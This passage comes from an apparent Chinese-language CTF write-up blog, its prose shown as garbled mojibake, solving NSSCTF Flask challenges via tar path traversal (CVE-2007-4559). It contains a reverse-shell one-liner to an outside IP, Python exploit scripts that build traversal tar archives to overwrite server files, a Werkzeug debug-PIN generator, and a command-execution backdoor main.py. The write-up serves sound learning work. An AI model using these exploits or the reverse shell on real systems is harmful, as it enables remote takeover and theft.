class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.islink(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">oct</span>(os.stat(filepath).st_mode)[-<span class="number">3</span>:] != <span class="string">&#x27;444&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(os.environ)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329195008532.png" alt="image-20230329195008532"></p><p>è¿™é‡Œç›¸è¾ƒäºv2ï¼Œå°±å¤šäº†è¿™ä¸¤è¡Œä»£ç </p><p>ç¬¬ä¸€ä¸ªæ˜¯åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºè½¯é“¾æ¥</p><p>ç¬¬äºŒä¸ªæ˜¯åˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶æƒé™æ˜¯ä¸æ˜¯444</p><p><strong>é¢„æœŸè§£</strong></p><p><strong>CVE-2007-4559</strong>æ¼æ´ï¼Œå¯ä»¥é€šè¿‡tar.extractall()å‡½æ•°çš„æ¼æ´ï¼Œè§£å‹æ–‡ä»¶æ—¶å€™ï¼Œè¦†ç›–æ‰ç›®å½•ä¸­çš„æ–‡ä»¶</p><p>flaskå¼€å¯äº†debug=trueæ¨¡å¼ï¼Œä¼šæœ‰/consoleæ§åˆ¶å°ï¼Œè®¡ç®—å‡ºPINç å³å¯è¿›å…¥æ§åˆ¶å°ã€‚</p><p>è¦†ç›–<code>tmp/clean.sh</code>,æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°shellï¼Œflagçš„æƒé™æ˜¯rootï¼Œå¯ä»¥é€šè¿‡ç®—PINç ï¼Œææƒæ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸º<code>main.py</code>çš„æƒé™æ˜¯<code>root</code></p><p>main.pyå°±æ˜¯debugæ§åˆ¶å°é‚£ï¼Œæ˜¯rootæƒé™ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ§åˆ¶å°æ¥è¯»å–flag</p><p>åå¼¹shellçš„åŸå› å°±æ˜¯ä¸ºäº†å¾—è·å–é¶æœºä¸­çš„ä¸œè¥¿æ¥è®¡ç®—pinç </p><ol><li>ä¸Šä¼ taræ–‡ä»¶ï¼Œè¦†ç›–æ‰clean.shï¼Œè°ƒç”¨clean()å‡½æ•°è°ƒç”¨exp.shï¼Œè¿›è¡Œåå¼¹shell<br><strong>exp.sh</strong>å¦‚ä¸‹ï¼š</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„æ—¶å€™å¾—åŠ æƒé™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp.sh</span><br></pre></td></tr></table></figure><p>xæ˜¯å¯æ‰§è¡Œçš„æ„æ€</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name = <span class="string">&#x27;../../../../tmp/clean.sh&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(<span class="string">&#x27;exp.sh&#x27;</span>, <span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/upload&#x27;</span></span><br><span class="line">    response = req.post(url=url, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/clean&#x27;</span></span><br><span class="line">    response = req.post(url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload()</span><br><span class="line">    clean()</span><br></pre></td></tr></table></figure><p>ç„¶åå…ˆç”Ÿæˆä¸€ä¸‹taråŒ…</p><p>è¿™é‡Œå°±æ˜¯å…ˆè¿›è¡ŒtaråŒ…çš„ä¸Šä¼ ï¼Œä¸Šä¼ ä¹‹åï¼Œå°±ä¼šè¿›è¡Œè§£å‹ï¼Œè§£å‹ä¹‹åå°±ä¼šè¦†ç›–æ‰clean.sh,ç„¶ååœ¨è®¿é—®/cleanå°±ä¼šæ‰§è¡Œä»£ç åå¼¹shelläº†</p><p><img src="../images/image-20230329203140055.png" alt="image-20230329203140055"></p><p>è¿™é‡Œä¸èƒ½åœ¨æœ¬åœ°å¼¹ï¼Œæœ¬åœ°å¼¹ä¸ä¸Šå»ï¼Œåªèƒ½åœ¨linuxä¸‹å¼¹</p><p><img src="../images/image-20230329203255973.png" alt="image-20230329203255973"></p><p>flagæ–‡ä»¶ä¸­å¹¶æ²¡æœ‰flagï¼Œflagåº”è¯¥åœ¨you_could_never_guess_the_flag_pathä¸­ï¼Œä½†æ˜¯åªæœ‰rootç”¨æˆ·èƒ½å¤Ÿè¯»å–ï¼Œå‘ç°main.pyæ˜¯rootæƒé™è¿è¡Œï¼Œå¯ä»¥è®¡ç®—PINç è¿›å…¥consoleæ§åˆ¶å°è·å–åˆ°flag</p><p><strong>ç”Ÿæˆpinç çš„è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376912775&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c8962099f22e5a1ea6fc770c8ef01846a5fdcb0335fa255abc4345c0bc72c44131a11f&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1./etc/machine-id    3./proc/self/cgroup  è¿™é“é¢˜æ˜¯ç”¨è¿™ä¸¤ä¸ª</p><p><img src="../images/image-20230329205003667.png" alt="image-20230329205003667"></p><p>æœ€åæ‹¿åˆ°flag</p><p><strong>éé¢„æœŸè§£</strong></p><p><em>Debugæ¨¡å¼ä¸‹</em>ï¼Œå½“<code>app.py</code>å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶ï¼Œ<a href="https://so.csdn.net/so/search?q=flask&amp;spm=1001.2101.3001.7020">flask</a>ä¼šé‡æ–°åŠ è½½</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.14.71.254:28077/&#x27;</span></span><br><span class="line">filename = <span class="string">r&quot;main.py&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name=<span class="string">&#x27;../../../app/main.py&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(filename,<span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">rawurl</span>):</span><br><span class="line"></span><br><span class="line">    url = rawurl + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    response = req.post(url = url, files = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">rawurl</span>):</span><br><span class="line">    url = rawurl + <span class="string">&#x27;download?filename=ls&#x27;</span></span><br><span class="line">    response = req.get(url)</span><br><span class="line">    <span class="built_in">print</span>(response.content)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    getFlag(url)</span><br></pre></td></tr></table></figure><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> os.popen(filename).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329213526571.png" alt="image-20230329213526571"></p><p>è¿™é‡Œå°±æ˜¯ä½¿ç”¨ä¸Šé¢çš„é‚£ä¸ªcveè¿›è¡Œmain.pyçš„è¦†ç›–ï¼Œè¦†ç›–åä¼šè¿›è¡Œé‡è½½ï¼Œå°±æ˜¯è‡ªå·±å†™ä¸€æ®µmain.pyçš„ä»£ç ï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ï¼Œmain.pyæ˜¯rootçš„ç”¨æˆ·</p><p>ç„¶åå°±å¯ä»¥æˆåŠŸrceäº†</p><p>è¿™ä¸‰é“é¢˜æ”¶è·æŒºå¤š</p><h2 id="NSSRound-7-Team-æ–°çš„åšå®¢"><a href="#NSSRound-7-Team-æ–°çš„åšå®¢" class="headerlink" title="[NSSRound#7 Team]æ–°çš„åšå®¢"></a>[NSSRound#7 Team]æ–°çš„åšå®¢</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230329213834003.png" alt="image-20230329213834003"></p><p>é¢˜ç›®</p><p><img src="../images/image-20230330192411011.png" alt="image-20230330192411011"></p><p><img src="../images/image-20230330193239428.png" alt="image-20230330193239428"></p><p>ç»è¿‡ä¸¤æ¬¡baseå’Œhexè§£å¯†å°±å¾—åˆ°<code>/static/www.tar.gz</code></p><p>ç„¶åè®¿é—®å°±ä¼šä¸‹è½½ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app/                                                                                                0000777 0000000 0000000 00000000000 14332615660 010036  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/                                                                                           0000777 0000000 0000000 00000000000 14332615660 010763  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/userinfo.json                                                                              0000777 0000000 0000000 00000000222 14332613615 013505  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        &#123;</span><br><span class="line">&quot;admin&quot;: &quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;</span><br><span class="line">&#125;                                                                                                                                                                                                                                                                                                                                                                              app/userData/                                                                                       0000777 0000000 0000000 00000000000 14332615671 011610  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/                                                                                 0000777 0000000 0000000 00000000000 14332615671 012700  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/flag                                                                             0000777 0000000 0000000 00000000070 14332613676 013537  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        æƒ³å¤šäº†è¿™é‡Œæ²¡æœ‰flag</span><br><span class="line"></span><br><span class="line">åªæœ‰adminæ‰èƒ½è·å¾—flag   </span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªä¸‹è½½çš„å†…å®¹æˆ‘ä»¬çŸ¥é“å®ƒçš„ç›®å½•æ–‡ä»¶ç»“æ„</p><p><img src="../images/image-20230330193459337.png" alt="image-20230330193459337"></p><p><img src="../images/image-20230330193539095.png" alt="image-20230330193539095"></p><p>ç‚¹å‡»åšå®¢å¤‡ä»½çš„è¯ä¼šä¸‹è½½ç”¨æˆ·å.tar.gzæ–‡ä»¶ï¼Œæ‰€ä»¥çŸ¥é“ä¸€ä¸ªç»“æ„</p><p><img src="../images/image-20230330193641866.png" alt="image-20230330193641866"></p><p>æˆ‘ä»¬å’Œä¸Šä¸€ä¸ªç›®å½•ç»“æ„å¯¹æ¯”ä¸€ä¸‹ï¼Œä¹Ÿæœ‰ä¸€ä¸ªflagï¼Œç„¶åä¸Šé¢ä¸€ä¸ªç”¨æˆ·åï¼Œæˆ‘ä»¬æ ¹æ®æ–‡ä»¶æ˜çŒœæµ‹æ‰€æœ‰çš„ç”¨æˆ·éƒ½æ”¾åœ¨userDataä¹‹ä¸‹ï¼ŒåŒ…æ‹¬adminç”¨æˆ·ã€‚</p><p>æ‰€ä»¥éé¢„æœŸè§£å°±æ˜¯åˆ©ç”¨åšå®¢æ¢å¤åŠŸèƒ½ï¼Œä¸Šä¼ tar.gzæ–‡ä»¶ï¼Œåˆ©ç”¨è¿™ä¸ªflagè½¯è¿æ¥æŒ‡å‘/app/conf/userinfo.jsonï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªæˆ‘ä»¬ä¿®æ”¹åçš„adminçš„sha1çš„jsonæ–‡ä»¶ï¼Œå°±å¯ä»¥ä¿®æ”¹adminçš„å¯†ç </p><p>è¿™é‡Œå› ä¸ºä¸è½¯é“¾æ¥è¿æ¥è¿‡åï¼Œä¿®æ”¹ç›®æ ‡æ–‡ä»¶çš„è¯ï¼Œæºæ–‡ä»¶ä¹Ÿä¼šè·Ÿç€ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›´æ¥å»ä¿®æ”¹è¿™ä¸ªç”¨æˆ·å.tar.gzï¼Œç„¶åapp/conf/userinfo.jsonä¹Ÿä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥å°±æ˜¯å¯ä»¥è‡ªå®šä¹‰adminçš„å¯†ç äº†(å› ä¸ºè¿˜æ˜¯é‚£ä¸ªæ¼æ´ï¼Œå°±æ˜¯è§£å‹æ—¶ä¼šè¦†ç›–æ‰ç›®å½•ä¸­çš„æ–‡ä»¶)</p><p><strong>é¢„æœŸè§£</strong></p><p>é¢„æœŸè§£æ˜¯åˆ©ç”¨ç›®å½•ç©¿è¶Šç›´æ¥è¦†ç›–æ‰userinfo.jsonæ–‡ä»¶å§ï¼Œåœ¨æé¢„æœŸè§£çš„æ—¶å€™çœŸçš„éå¸¸å¤´ç–¼ï¼Œä¸€ç›´æ‰‹æ’¸ä¸å‡ºæ¥é‚£ä¸ªç›®å½•ç»“æ„ï¼ŒåŒæ—¶åˆ©ç”¨å®˜æ–¹WPçš„è„šæœ¬ä¸€ç›´æŠ¥é”™ï¼Œå°±å¾ˆéš¾å—ï¼Œæ— å¥ˆåªèƒ½æ”¹ä¸€ä¸‹è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;qingfeng&#x27;</span> <span class="comment"># ä½ æ³¨å†Œæ—¶ç”¨çš„ç”¨æˆ·åï¼Œå°½é‡åˆ«æœ‰å¥‡æ€ªçš„ç¬¦å·</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># ä¹‹åè¦ä½¿ç”¨adminè´¦æˆ·ç™»é™†æ—¶çš„å¯†ç </span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span 